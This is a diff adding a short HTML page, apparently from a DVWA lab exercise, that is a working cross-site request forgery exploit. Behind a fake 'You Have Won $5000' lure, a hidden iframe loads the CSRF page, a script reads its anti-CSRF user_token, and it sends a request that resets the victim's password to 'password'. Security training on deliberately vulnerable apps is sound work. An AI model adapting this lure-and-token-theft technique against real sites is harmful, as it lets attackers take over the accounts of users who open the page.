@@ -1,0 +1,19 @@
+<html>
+ <body>
+  <p>You Have Won $5000 </p>
+  <iframe id="myFrame" src="http://localhost/DVWA/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
+  <script>
+   function maliciousPayload() {
+    console.log("start");
+    var iframe = document.getElementById("myFrame");
+    var doc = iframe.contentDocument  || iframe.contentWindow.document;
+    var token = doc.getElementsByName("user_token")[0].value;
+    const http = new XMLHttpRequest();
+    const url = "http://localhost/DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change&user_token="+token+"#";
+    http.open("GET", url);
+    http.send();
+    console.log("password changed");
+   }
+  </script>
+ </body>
+</html>
